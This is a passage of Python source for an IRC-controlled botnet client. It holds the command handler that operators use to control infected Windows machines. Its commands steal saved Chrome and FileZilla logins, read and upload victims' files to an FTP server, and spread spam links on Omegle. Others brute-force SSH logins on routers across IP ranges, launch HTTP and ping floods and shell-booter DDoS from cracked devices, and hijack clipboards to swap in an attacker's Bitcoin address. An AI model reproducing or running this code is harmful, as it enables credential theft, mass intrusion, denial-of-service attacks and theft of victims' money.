                                sendmsg("Syntax: "+cmdprefix+"omeglespreader Skype/URL[Choice] Skype Threads",s,outputChannel)
                            else:
                                omeglespreaderparameters = command.split()
                                worked=True
                                try:
                                    omeglespreaderSkypeorURLchoice = omeglespreaderparameters[4]
                                except:
                                    worked=False
                                    sendmsg("Error! You must specify weather or not you would like to use Skype, or a URL.",s,outputChannel)
                                    pass
                                if worked == True:
                                    try:
                                        omeglespreaderSkypeorURL = omeglespreaderparameters[5]
                                    except:
                                        worked=False
                                        sendmsg("Error! You need to specify a Skype or URL to spread.",s,outputChannel)
                                        pass
                                    if worked == True:
                                        try:
                                            omeglespreaderthreads = omeglespreaderparameters[6]
                                        except:
                                            worked=False
                                            sendmsg("Error! You need to specify the amount of threads to use for spreading.",s,outputChannel)
                                            pass
                                        if worked == True:
                                            Skype=True
                                            if omeglespreaderSkypeorURLchoice.lower() == "url" or omeglespreaderSkypeorURLchoice.lower() == "web" or omeglespreaderSkypeorURLchoice.lower() == "website":
                                                Skype=False
                                            outputText = "Skype account"
                                            if Skype == False:
                                                outputText = "URL"
                                            if worked == True:
                                                doomeglespreader=True
                                                if talk == True:
                                                    sendmsg("Spreading "+outputText+" "+omeglespreaderSkypeorURL+" with "+omeglespreaderthreads+" threads.",s,outputChannel)
                                                for x in range(0,int(omeglespreaderthreads)):
                                                    start_new_thread(omegleConnect, (omeglespreaderSkypeorURLchoice, omeglespreaderSkypeorURL))
                                                if talk == True:
                                                    sendmsg("Spreader started!",s,outputChannel)
                        elif cmdprefix+"omeglestatus" in command.lower().split(" ")[3]:
                            if cmdprefix+"omeglestatus.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"omeglestatus - Grabs the status of the omegle spreader.",s,outputChannel)
                            else:
                                if doomeglespreader == True and talk == True:
                                    sendmsg("Omegle spreader is running.",s,outputChannel)
                                elif talk == True:
                                    sendmsg("Omegle spreader is not running.",s,outputChannel)
                        elif cmdprefix+"stopomeglespreader" in command.lower().split(" ")[3]:
                            if cmdprefix+"stopomeglespreader.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"stopomeglespreader - Stops spreading on Omegle.",s,outputChannel)
                            else:
                                if doomeglespreader == True:
                                    doomeglespreader=False
                                    if talk == True:
                                        sendmsg("Omegle Spreader stopped!",s,outputChannel)
                                else:
                                    if talk == True:
                                        sendmsg("Omegle Spreader not running!",s,outputChannel)
                        elif cmdprefix+"die" in command.lower().split(" ")[3]:
                            if cmdprefix+"die.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"die - Kills bot instance.",s,outputChannel)
                            else:
                                doDie = True
                                shutOffprotection(False)
                                if talk == True:
                                    sendmsg("Ending bot instance...", s, outputChannel)
                                s.send("QUIT\n")
                                raise SystemExit
                        elif cmdprefix+"uninstall" in command.lower().split(" ")[3]:
                            if cmdprefix+"uninstall.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"uninstall confirm - Uninstalls bot.",s,outputChannel)
                            wxz=False
                            try:
                                a = command.split(" ")[4]
                                wxz=True
                            except:
                                pass
                            if wxz == True:
                                if not "confirm" in command.lower().split(" ")[4]:
                                    sendmsg("Error! You must type "+cmdprefix+"uninstall confirm to uninstall the bot.",s,outputChannel)
                                elif cmdprefix+"uninstall" in command.lower().split(" ")[3] and "confirm" in command.lower.split(" ")[4]:
                                    doDie = True
                                    shutOffprotection(True)
                                    if talk == True:
                                        sendmsg("Uninstalling bot...", s, outputChannel)
                                    s.send("QUIT\n")
                                    raise SystemExit
                            else:
                                sendmsg("Error! You must type "+cmdprefix+"uninstall confirm to uninstall the bot.",s,outputChannel)
                        elif cmdprefix+"os" in command.lower().split(" ")[3]:
                            if cmdprefix+"os.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"os - Provides you with bot operating system information.",s,outputChannel)
                            else:
                                if talk == True:
                                    sendmsg("[System: "+system()+"][Release: "+release()+"]", s, outputChannel)
                        elif cmdprefix+"checkhost" in command.lower().split(" ")[3]:
                            if cmdprefix+"checkhost.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"checkhost host port - Checks if a host is online using TCP and HTTP.",s,outputChannel)
                            else:
                                checkhostparameters = command.split()
                                worked=True
                                try:
                                    host = checkhostparameters[4]
                                except:
                                    worked=False
                                    sendmsg("Error! You must specify the DNS/IP you wish to check.",s,outputChannel)
                                    pass
                                try:
                                    port = checkhostparameters[5]
                                except:
                                    worked=False
                                    sendmsg("Error! You must specify the port of the host you wish to check.",s,outputChannel)
                                    pass
                                HTTPconnect=False
                                TCPconnect=False
                                if worked == True:
                                    try:
                                        testSocket = socket(AF_INET, SOCK_STREAM)
                                        testSocket.connect((host, int(port)))
                                        TCPconnect=True
                                        testSocket.close()
                                    except:
                                        pass
                                    try:
                                        urlopen("http://"+host+":"+port+"/").read()
                                        HTTPconnect=True
                                    except:
                                        pass
                                    outputText = "TCP Connect: "
                                    if TCPconnect == True:
                                        outputText = outputText + "Success. HTTP Connect: "
                                    else:
                                        outputText = outputText + "Failure. HTTP Connect: "
                                    if HTTPconnect == True:
                                        outputText  = outputText + "Success."
                                    else:
                                        outputText = outputText + "Failure."
                                    if talk == True:
                                        sendmsg(outputText, s, outputChannel)
                        elif cmdprefix+"botkiller.status" in command.lower().split(" ")[3]:
                            if cmdprefix+"botkiller.status.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"botkiller.status - Retrieves the status of the bots' botkiller.")
                            else:
                                if botkiller == True:
                                    if talk == True:
                                        sendmsg("Botkiller enabled.", s, outputChannel)
                                else:
                                    if talk == True:
                                        sendmsg("Botkiller disabled.", s, outputChannel)
                        elif cmdprefix+"botkiller.help" in command.lower().split(" ")[3]:
                            sendmsg("Syntax: "+cmdprefix+"botkiller.on/off - starts/stops killing other malware detected on bots' machines.",s,outputChannel)
                        elif cmdprefix+"botkiller.on" in command.lower().split(" ")[3]:
                            if cmdprefix+"botkiller.on.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"botkiller.on - Proactively kills other malware detected on the bots' system.",s,outputChannel)
                            else:
                                if botkiller == False:
                                    botkiller = True
                                    if talk == True:
                                        sendmsg("Botkiller started.", s, outputChannel)
                                else:
                                    if talk == True:
                                        sendmsg("Botkiller already running.", s, outputChannel)
                        elif cmdprefix+"botkiller.off" in command.lower().split(" ")[3]:
                            if cmdprefix+"botkiller.off.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"botkiller.off - Stops proactive bot-killer.",s,outputChannel)
                            else:
                                if botkiller == True:
                                    botkiller=False
                                    if talk == True:
                                        sendmsg("Botkiller killed.", s, outputChannel)
                                else:
                                    if talk == True:
                                        sendmsg("Botkiller not running.", s, outputChannel)
                        elif cmdprefix+"howmanyprocesses" in command.lower().split(" ")[3]:
                            if cmdprefix+"howmanyproceses.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"howmanyprocesses Process_Name.exe",s,outputChannel)
                            else:
                                process_name=""
                                try:
                                    process_name = command.split(" ")[4]
                                except:
                                    sendmsg("Error! You forgot to specify the process.",s,outputChannel)
                                    pass
                                if not process_name == "":
                                    sendmsg("Number of processes named "+process_name+" open: "+str(NumberProcsOpen(process_name)),s,outputChannel)
                        elif cmdprefix+"isprocessrunning" in command.lower().split(" ")[3]:
                            if cmdprefix+"isprocessrunning.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"isprocessrunning Process_Name.exe",s,outputChannel)
                            else:
                                try:
                                    if IsProcessRunning(command.split()[4]) == True and talk == True:
                                        sendmsg("Process running.",s,outputChannel)
                                    elif talk == True:
                                        sendmsg("Process not running.",s,outputChannel)
                                except:
                                    sendmsg("Error! You must specify the process to check weather or not it is running.",s,outputChannel)
                                    pass
                        elif cmdprefix+"say" in command.lower().split(" ")[3]:
                            if cmdprefix+"say.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"say Text to output via speakers - Text to Speech function.",s,outputChannel)
                            else:
                                sayparameters=command.split()
                                x=0
                                outputText = ""
                                for parameter in sayparameters:
                                    if x == 4:
                                        outputText = outputText + parameter
                                    elif x > 4:
                                        outputText = outputText + " " + parameter
                                    x=x+1
                                if not outputText == "" and not outputText == " ":
                                    if talk == True:
                                        sendmsg("Attempting to output via speakers: " + outputText, s, outputChannel)
                                    try:
                                        say(outputText)
                                        if talk == True:
                                            sendmsg("Text outputted via speakers.", s, outputChannel)
                                    except:
                                        sendmsg("Error outputting text via the speakers.",s,outputChannel)
                                        pass
                                else:
                                    sendmsg("Error! You must specify the text to output via the speakers.",s,outputChannel)
                        elif cmdprefix+"dir" in command.lower().split(" ")[3]:
                            if cmdprefix+"dir.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"dir C:\ - Lists all files & folders within a directory.", s, outputChannel)
                            else:
                                dirparameters=command.split()
                                x=0
                                Directory = ""
                                for parameter in dirparameters:
                                    if x == 4:
                                        Directory = Directory + parameter
                                    elif x > 4:
                                        Directory = Directory + " " + parameter
                                    x=x+1
                                if not Directory == "" and not Directory == " ":
                                    if "%" in Directory.lower():
                                        num=0
                                        for them in Directory.split("%"):
                                            num=num+1
                                        if num == 2:
                                            theEnvVar = Directory.split("%")[1].split("%")[0]
                                            Directory=Directory.replace("%"+theEnvVar+"%", getenv(theEnvVar))
                                    if talk == True:
                                        sendmsg("[Directory Listing of: " + Directory + "]", s, outputChannel)
                                    try:
                                        current, dirs, files = walk(Directory).next()
                                        for filename in files:
                                            if talk == True:
                                                sendmsg("File: " + filename, s, outputChannel)
                                        for thedir in dirs:
                                            if talk == True:
                                                sendmsg("Directory: " + thedir, s, outputChannel)
                                    except Exception as ex:
                                        sendmsg("Error getting directory listing. Error: "+str(ex),s,outputChannel)
                                        pass
                                else:
                                    sendmsg("Error! You must specify the directory you would like to list.",s,outputChannel)
                        elif cmdprefix+"uploadfile" in command.lower().split(" ")[3]:
                            if cmdprefix+"uploadfile.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"UploadFile ftpserver.com user password /remotefile.txt C:\localfile.txt", s, outputChannel)
                            else:
                                ftpparameters = command.split()
                                worked=True
                                try:
                                    host = ftpparameters[4]
                                except:
                                    worked=False
                                    sendmsg("Error! You must specify the host you would like to send the file to.", s, outputChannel)
                                    pass
                                if worked == True:
                                    try:
                                        user = ftpparameters[5]
                                    except:
                                        worked=False
                                        sendmsg("Error! You must specify the user you would like to send the file as.", s, outputChannel)
                                        pass
                                    if worked == True:
                                        try:
                                            password = ftpparameters[6]
                                        except:
                                            worked=False
                                            sendmsg("Error! You must specify the FTP password.", s, outputChannel)
                                            pass
                                        if worked == True:
                                            try:
                                                remotefile = ftpparameters[7]
                                            except:
                                                worked=False
                                                sendmsg("Error! You must specify the remote destination of your local file.", s, outputChannel)
                                                pass
                                            if worked == True:
                                                localfile = ""
                                                for parameter in ftpparameters:
                                                    x=x+1
                                                    if x == 9:
                                                        localfile = localfile + parameter
                                                    elif x > 9:
                                                        localfile = localfile + " " + parameter
                                                if not localfile == "" and not localfile == " ":
                                                    try:
                                                        ftp = FTP(host, user, password)
                                                    except Exception as ex:
                                                        worked=False
                                                        sendmsg("Error! Couldn not log onto the FTP server. Exception: " + str(ex), s, outputChannel)
                                                        pass
                                                    if worked == True:
                                                        try:
                                                            ftp.cwd(remotefile)
                                                        except Exception as ex:
                                                            worked=False
                                                            sendmsg("Error! Unable to set the remote file variable server-side. Exception: " + str(ex), s, outputChannel)
                                                            try:
                                                                ftp.close()
                                                            except Exception as ex:
                                                                worked=False
                                                                sendmsg("Error closing FTP connection.", s, outputChannel)
                                                                pass
                                                            pass
                                                        if worked == True:
                                                            try:
                                                                chdir(localfile)
                                                            except Exception as ex:
                                                                worked=False
                                                                sendmsg("Error! Unable to set the local file server-side. Exception: " + str(ex), s, outputChannel)
                                                                try:
                                                                    ftp.close()
                                                                except Exception as ex:
                                                                    worked=False
                                                                    sendmsg("Error closing FTP connection.", s, outputChannel)
                                                                    pass
                                                                pass
                                                            if worked == True:
                                                                try:
                                                                    myfile = open(localfile, "r")
                                                                except ex as Exception:
                                                                    worked=False
                                                                    sendmsg("There was an error opening the local file "+localfile+" - Exception: "+str(ex), s, outputChannel)
                                                                    try:
                                                                        ftp.close()
                                                                    except Exception as ex:
                                                                        worked=False
                                                                        sendmsg("Error closing FTP connection.", s, outputChannel)
                                                                        pass
                                                                    pass
                                                                if worked == True:
                                                                    try:
                                                                        ftp.storlines("STOR " + localfile, myfile) 
                                                                        myfile.close()
                                                                        if talk == True:
                                                                            sendmsg("File uploaded successfully.", s, outputChannel)
                                                                    except Exception as ex:
                                                                        worked=False
                                                                        sendmsg("Error reading the local file onto the remote server. Exception: "+str(ex), s, outputChannel)
                                                                        try:
                                                                            ftp.close()
                                                                        except Exception as ex:
                                                                            worked=False
                                                                            sendmsg("Error closing FTP connection.", s, outputChannel)
                                                                            pass
                                                                        myfile.close()
                                                                        pass
                                                else:
                                                    sendmsg("Error! You must specify the local file you would like to place on the FTP server.", s, outputChannel)
                        elif cmdprefix+"readfile" in command.lower().split(" ")[3]:
                            if cmdprefix+"readfile.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"ReadFile \\Documents and Settings\\Admin\\Desktop\\file.txt - Read a file line-by-line to the IRC channel. You may specify one environment variable using percent signs, such as %APPDATA%.", s, outputChannel)
                            else:
                                readfileparameters=command.split()
                                worked=True
                                fileName=""
                                x=0
                                for parameter in readfileparameters:
                                    if x == 4:
                                        fileName = fileName + parameter
                                    elif x > 4:
                                        fileName = fileName + " " + parameter
                                    x=x+1
                                if not fileName == "" and not fileName == " ":
                                    if "%" in fileName.lower():
                                        num=0
                                        for them in fileName.split("%"):
                                            num=num+1
                                        if num == 2:
                                            theEnvVar = fileName.split("%")[1].split("%")[0]
                                            fileName=fileName.replace("%"+theEnvVar+"%", getenv(theEnvVar))
                                    text = ""
                                    try:
                                        text = urlopen(fileName).read().split("\n")
                                    except Exception as ex:
                                        worked=False
                                        sendmsg("Error! Unable to read the file: "+fileName+". Exception: "+str(ex), s, outputChannel)
                                        pass
                                    if worked == True:
                                        sendmsg("Reading file: " + fileName + "...", s, outputChannel)
                                        for line in text:
                                            sendmsg(line, s, outputChannel)
                                        sendmsg("File read operation completed successfully.", s, outputChannel)
                                else:
                                    sendmsg("Error! You must specify the file you would like to read to the IRC channel.", s, outputChannel)
                        elif cmdprefix+"filezilla" in command.lower().split(" ")[3]:
                            if cmdprefix+"filezilla.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"FileZilla Keyword - Retrieves saved FileZilla logins if they contain a keyword. Set the keyword as ALL to return all saved logins", s, outputChannel)
                            else:
                                fileZillaparameters=command.split()
                                worked=False
                                keyword=""
                                try:
                                    keyword=fileZillaparameters[4]
                                    worked=True
                                except:
                                    pass
                                if worked == True and not keyword == "":
                                    shoitzilla(keyword,s,outputChannel)
                                else:
                                    sendmsg("Error! You must specify the keyword to check logins for.",s,outputChannel)
                        elif cmdprefix+"sshscannerstatus" in command.lower().split(" ")[3]:
                            if cmdprefix+"sshscannerstatus.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: !SSHScannerStatus - Outputs weather or not any SSH scans are running", s, outputChannel)
                            else:
                                if doSSHscan == True and talk == True:
                                    sendmsg("SSH scanner running!", s, outputChannel)
                                elif talk == True:
                                    sendmsg("SSH scanner not running!", s, outputChannel)
                        elif cmdprefix+"sshscanner" in command.lower():
                            if cmdprefix+"sshscanner.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: !SSHScanner A,B,C/192,192.168,192.168.1 ftp/http/https/ftps://example.com/user-pass-combo.list(or A/B/C/D) 1/0(block gov ips) 1/0(use Tor for port scan) 3(tcp port scan ping timeout) 35(ssh connection timeout) min_chars(minimum amount of characters to use when brute-forcing, if applicable.) max_chars(maximum amount of characters to use when brute-forcing, if applicable.) 22(port, use commas for multiple ports, such as 22,2222,21)", s, outputChannel)
                                sendmsg(" 256(threads). - Use multiple IP ranges, or just scan one. Combo list should have a username and password on each line, such as root:alpine. A Range = tiny, great for quick routers. covers most logins. B Range = larger, covers more routers. C Range = giant, covers even more routers and servers. D Range = large, covers only root user and mostly routers.", s, outputChannel)
                            else:
                                sshscannerparameters=command.split()
                                worked=True
                                try:
                                    ipclassinfo = sshscannerparameters[4]
                                    if not "/" in ipclassinfo or ipclassinfo.split("/")[0] == "" or ipclassinfo.split("/")[1] == "" or ipclassinfo.split("/")[0] == " " or ipclassinfo.split("/")[1] == " ":
                                        worked=False
                                        sendmsg("Error! Improper IP range information. \"Set it as B/113.53\", or \"A,B/64,98.128\", etc. Make sure not to have the IP range/s in double or single quotes.", s, outputChannel)
                                except:
                                    worked=False
                                    sendmsg("Error! IP range not specified!", s, outputChannel)
                                    pass
                                if worked == True:
                                    try:
                                        username_password_combo_list = sshscannerparameters[5]
                                        if not "http://" in username_password_combo_list.lower() and not "ftp://" in username_password_combo_list.lower() and not "ftps://" in username_password_combo_list.lower() and not "https://" in username_password_combo_list.lower() and not username_password_combo_list.lower() == "rand" and not username_password_combo_list.lower() == "a" and not username_password_combo_list.lower() == "b" and username_password_combo_list.lower() == "c" and not username_password_combo_list.lower() == "d" and not username_password_combo_list.lower() == "brute":
                                            worked=False
                                            sendmsg("Error! Unknown user/password combo list specified.", s, outputChannel)
                                    except:
                                        worked=False
                                        sendmsg("Error! You must specify the username/password combo list.", s, outputChannel)
                                        pass
                                    if worked == True:
                                        try:
                                            blockGovIPS = sshscannerparameters[6]
                                        except:
                                            worked=False
                                            sendmsg("Error! You must specify weather or not you would like to disclude government IP addresses from your scan", s, outputChannel)
                                            pass
                                        if worked == True:
                                            use_gov_ip_blocklist = False
                                            if blockGovIPS.lower() == "y" or blockGovIPS.lower() == "yes" or blockGovIPS == "1" or blockGovIPS == "+" or blockGovIPS.lower() == "true":
                                                use_gov_ip_blocklist = True
                                            use_tor_port_scan = False
                                            try:
                                                useTorPS = sshscannerparameters[7]
                                                if useTorPS.lower() == "y" or useTorPS.lower() == "yes" or useTorPS == "1" or useTorPS == "+" or useTorPS.lower() == "true":
                                                    use_tor_port_scan = True
                                            except:
                                                worked=False
                                                sendmsg("Error! You must specify weather or not you would like to scan ports through the Tor network.", s, outputChannel)
                                                pass
                                            if worked == True:
                                                tcp_ping_timeout=3
                                                try:
                                                    tcp_ping_timeout_var = sshscannerparameters[8]
                                                    try:
                                                        tcp_ping_timeout=int(tcp_ping_timeout_var)
                                                    except:
                                                        worked=False
                                                        sendmsg("Error! TCP ping timeout specified: " + tcp_ping_timeout_var + " is not an integer.", s, outputChannel)
                                                        pass
                                                except:
                                                    worked=False
                                                    sendmsg("Error! You must specify the TCP ping timeout for port scanning.", s, outputChannel)
                                                    pass
                                                if worked == True:
                                                    ssh_ping_timeout=30
                                                    try:
                                                        ssh_ping_timeout_a = sshscannerparameters[9]
                                                        try:
                                                            ssh_ping_timeout = ssh_ping_timeout_a
                                                        except:
                                                            worked=False
                                                            sendmsg("Error! SSH connection timeout: "+ssh_ping_timeout_a+" is not an integer.", s, outputChannel)
                                                            pass
                                                    except:
                                                        worked=False
                                                        sendmsg("Error! You must specify the SSH connection timeout", s, outputChannel)
                                                        pass
                                                    min_chars=0
                                                    max_chars=8
                                                    if worked == True:
                                                        if username_password_combo_list.lower() == "brute":
                                                            try:
                                                                min_chars_a = sshscannerparameters[10]
                                                                try:
                                                                    min_chars = int(min_chars_a)
                                                                except:
                                                                    worked=False
                                                                    sendmsg("Error! Minimum brute-force characters: " + min_chars_a + " is not an integer.", s, outputChannel)
                                                                    pass
                                                            except:
                                                                worked=False
                                                                sendmsg("Error! You must specify the minimum amount of characters to use when brute-forcing.", s, outputChannel)
                                                                pass
                                                            if worked == True:
                                                                try:
                                                                    max_chars_a = sshscannerparameters[11]
                                                                    try:
                                                                        max_chars = int(max_chars_a)
                                                                    except:
                                                                        worked=False
                                                                        sendmsg("Error! Maximum brute-force characters: " + max_chars_a + " is not an integer.", s, outputChannel)
                                                                        pass
                                                                except:
                                                                    worked=False
                                                                    sendmsg("Error! You must specify the maximum amount of characters to use when brute-forcing.", s, outputChannel)
                                                                    pass
                                                        if worked == True:
                                                            ports=""
                                                            try:
                                                                if not username_password_combo_list.lower() == "brute":
                                                                    ports = sshscannerparameters[10]
                                                                else:
                                                                    ports = sshscannerparameters[12]
                                                            except:
                                                                worked=False
                                                                sendmsg("Error! You must specify the port/s to scan for SSH servers.", s, outputChannel)
                                                                pass
                                                            if worked == True:
                                                                    threads=0
                                                                    if not username_password_combo_list.lower() == "brute":
                                                                        try:
                                                                            threads = int(sshscannerparameters[11])
                                                                        except:
                                                                            worked=False
                                                                            try:
                                                                                worked=False
                                                                                sendmsg("Error! The amount of threads specified: " + sshscannerparameters[12] + " are not in the correct format.", s, outputChannel)
                                                                            except:
                                                                                worked=False
                                                                                sendmsg("Error! The amount of threads to scan with was not provided.", s, outputChannel)
                                                                                pass
                                                                            pass
                                                                    else:
                                                                        try:
                                                                            threads = int(sshscannerparameters[13])
                                                                        except:
                                                                            worked=False
                                                                            try:
                                                                                worked=False
                                                                                sendmsg("Error! The amount of threads specified: " + sshscannerparameters[14] + " are not in the correct format.", s, outputChannel)
                                                                            except:
                                                                                worked=False
                                                                                sendmsg("Error! The amount of threads to scan with was not provided.", s, outputChannel)
                                                                                pass
                                                                            pass
                                                                    if worked == True:
                                                                        doSSHscan=True
                                                                        for x in range(0,threads):
                                                                            start_new_thread(sshScanner, (ipclassinfo, username_password_combo_list, use_gov_ip_blocklist, tcp_ping_timeout, ssh_ping_timeout, min_chars, max_chars, ports, send_to_server))
                                                                        if talk == True:
                                                                            sendmsg("SSH scan started!",s, outputChannel)
                        elif cmdprefix+"sshddos" in command.lower().split(" ")[3]:
                            if cmdprefix+"sshddos.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: !SSHDDoS mode[1=httpflood,2=stopddos,3=pingflood] server[example.com] processes[amount of attack processes on each router] - Put %rand% somewhere in the server for a random number from 0 to 25565 - Uses routers cracked through your bots to launched an attack.", s, outputChannel)
                            else:
                                sshddosparameters = command.split()
                                worked=True
                                try:
                                    mode = int(sshddosparameters[4])
                                except Exception as ex:
                                    worked=False
                                    sendmsg("Error! Either you did not specify the attack mode, or the attack mode wasn not an integer. Exception: "+str(ex), s, outputChannel)
                                    pass
                                if worked == True:
                                    server=""
                                    if not mode == 2:
                                        try:
                                            server = sshddosparameters[5]
                                        except:
                                            worked=False
                                            sendmsg("Error! You must specify the server you would like to attack.", s, outputChannel)
                                            pass
                                    if worked == True:
                                        processes=0
                                        if not mode == 2:
                                            try:
                                                processes = int(sshddosparameters[6])
                                            except Exception as ex:
                                                worked=False
                                                sendmsg("Error! Either you did not specify the amount of processes to attack with, or the amount wasn not an integer.", s, outputChannel)
                                                pass
                                        if worked == True:
                                            if (mode == 1 or mode == 2 or mode == 3) and (worked == True):
                                                start_new_thread(sshDDoS, (mode, server, processes))
                                                if talk == True:
                                                    if mode == 2:
                                                        sendmsg("SSH-Amplified DDoS stopped.", s, outputChannel)
                                                    else:
                                                        sendmsg("SSH-Amplified DDoS launched.", s, outputChannel)
                                            else:
                                                sendmsg("Error! Invalid attack mode specified!", s, outputChannel)
                        elif cmdprefix+"sshservers" in command.lower().split(" ")[3]:
                            if cmdprefix+"sshservers.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: !sshservers - Outputs the amount of routers the bot has cracked.", s, outputChannel)
                            else:
                                numsshds=0
                                hosts = []
                                try:
                                    f = open(getenv("APPDATA")+sshdsAppDataFolder+sshdsFile, "r")
                                    hosts = f.read().split()
                                    f.close()
                                except:
                                    pass
                                for host in hosts:
                                    numsshds=numsshds+1
                                if talk == True:
                                    sendmsg("Cracked roots: " + str(numsshds), s, outputChannel)
                        elif cmdprefix+"stopsshscanner" in command.lower().split(" ")[3]:
                            if cmdprefix+"stopsshscanner.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: !StopSSHScanner - Stops any running SSH scans.", s, outputChannel)
                            else:
                                if doSSHscan == True and talk == True:
                                    doSSHscan = False
                                    sendmsg("SSH scan/s stopped.", s, outputChannel)
                                elif talk == True:
                                    sendmsg("No SSH scan/s running.", s, outputChannel)
                        elif cmdprefix+"killprocess" in command.lower().split(" ")[3]:
                            if cmdprefix+"killprocess.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: !KillProcess process_name.exe", s, outputChannel)
                            else:
                                killProcessparameters=command.split()
                                worked=True
                                process=""
                                try:
                                    process = killProcessparameters[4]
                                except:
                                    worked=False
                                    pass
                                if worked == True:
                                    if IsProcessRunning(process):
                                        killProcess(process)
                                        if IsProcessRunning(process) == False and talk == True:
                                            sendmsg("Success! Process: "+process+" killed.", s, outputChannel)
                                        elif talk == True:
                                            sendmsg("Error! Could not kill process: "+process+".", s, outputChannel)
                                    elif talk == True:
                                        sendmsg("Process: "+process+" is not running.", s, outputChannel)
                                elif talk == True:
                                    sendmsg("Error! You must specify the process you would like to kill.", s, outputChannel)
                        elif cmdprefix+"shellbooter" in command.lower().split(" ")[3]:
                            if cmdprefix+"shellbooter.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"shellbooter time(seconds) ip port http://pastebin.com/shell-list.txt threads(per shell) - Shell booter API",s,outputChannel)
                            else:
                                time = 0.0
                                try:
                                    time = float(command.split(" ")[4])
                                except:
                                    sendmsg("Error! Time must be a integer or floating point.",s,outputChannel)
                                    time = 0.6
                                    pass
                                if time < 1:
                                    sendmsg("Error! Time must be above 0 seconds.",s,outputChannel)
                                if not time == 0.6:
                                    ip = ""
                                    try:
                                        ip = command.split(" ")[5]
                                    except:
                                        pass
                                    if ip == "":
                                        sendmsg("Error! You must specify the IP you'd like to attack.",s,outputChannel)
                                    else:
                                        port = 0
                                        try:
                                            port = int(command.split(" ")[6])
                                        except:
                                            sendmsg("Error! Port is not an integer.",s,outputChannel)
                                            port = 655350
                                            pass
                                        if port < 1 or port > 65535:
                                            sendmsg("Error! Port can not be zero, a floating-point, or above 65535.",s,outputChannel)
                                        else:
                                            threads = 0
                                            try:
                                                threads = int(command.split(" ")[7])
                                            except:
                                                sendmsg("Error! You forgot to specify threads, or it wasn't an integer.",s,outputChannel)
                                                threads = 696969
                                                pass
                                            if not threads == 696969 and threads < 1:
                                                sendmsg("Error! Threads must be higher than one.",s,outputChannel)
                                            elif not threads == 696969:
                                                shellist = ""
                                                try:
                                                    shellist = command.split(" ")[8]
                                                except:
                                                    pass
                                                if shellist == "":
                                                    sendmsg("Error! You must specify a direct link to your shell list.",s,outputChannel)
                                                else:
                                                    shellBoot(time, threads, ip, port, shellist)
                                                    if talk == True:
                                                        sendmsg("Shellboot started!",s,outputChannel)
                        elif cmdprefix+"chromestealer" in command.lower().split(" ")[3]:
                            if cmdprefix+"chromestealer.help" in command.lower().split(" ")[3]:
                                sendmsg("Syntax: "+cmdprefix+"chromestealer keyword/ALL - Search ALL chrome logins, or based on a keyword.",s,outputChannel)
                            else:
                                keyword=""
                                try:
                                    keyword=command.split(" ")[4]
                                except:
                                    pass
                                if not keyword == "":
                                    ChromeStealer(s,outputChannel,keyword)
                                else:
                                    sendmsg("Error! You must specify the keyword, or ALL you'd like to search for chrome logins upon.",s,outputChannel)
                        elif cmdprefix+"clipcoin" in command.lower().split(" ")[3]:
                            if cmdprefix+"clipcoin.disable" in command.lower().split(" ")[3]:
                                enabled = False
                                for theFile in listdir(getenv("APPDATA")+installDir):
                                    if theFile.endswith(".ini"):
                                        enabled=False
                                        with open(getenv("APPDATA")+installDir+"\\"+theFile, "r") as fileContents:
                                            if "1" in fileContents.read() or "2" in fileContents.read() or "3" in fileContents.read():
                                                enabled=True
                                        if enabled == True:
                                            remove(getenv("APPDATA")+installDir+"\\"+theFile)
                                            sendmsg("clipcoin disabled.",s,outputChannel)
                                if enabled == False:
                                    sendmsg("clipcoin not enabled.",s,outputChannel)
                            elif cmdprefix+"clipcoin.setaddress" in command.lower().split(" ")[3]:
                                btcAddress=""
                                try:
                                    btcAddress=command.split(" ")[4]
                                except:
                                    pass
                                if not btcAddress == "":
                                    if talk == True:
                                        sendmsg("Setting Bitcoin address: "+btcAddress+" for replacing within the bots' clipboard.",s,outputChannel)
                                    worked=False
                                    for theFile in listdir(getenv("APPDATA")+installDir):
                                        if theFile.endswith(".ini"):
                                            with open(getenv("APPDATA")+installDir+"\\"+theFile, "w") as BTCout:
                                                BTCout.write(btcAddress)
                                                worked=True
                                    if worked == False:
                                        with open(getenv("APPDATA")+installDir+"\\"+choice(letters+digits)+".ini", "w") as BTCout:
                                            BTCout.write(btcAddress)
                                    if talk == True:
                                        sendmsg("BTC address for replacement in bots' clipboards set.",s,outputChannel)
                                else:
                                    sendmsg("Error! You must specify the Bitcoin address that will be replaced within the bots' clipboards.",s,outputChannel)
                            elif cmdprefix+"clipcoin.status" in command.lower().split(" ")[3]:
                                enabled = False
                                for theFile in listdir(getenv("APPDATA")+installDir):
                                    if theFile.endswith(".ini"):
                                        enabled=False
                                        with open(getenv("APPDATA")+installDir+"\\"+theFile, "r") as fileContents:
                                            if "1" in fileContents.read() or "2" in fileContents.read() or "3" in fileContents.read():
                                                enabled=True
                                        if enabled == True:
                                            sendmsg("clipcoin is running.",s,outputChannel)
                                if enabled == False:
                                    sendmsg("clipcoin is not running.",s,outputChannel)
                            else:
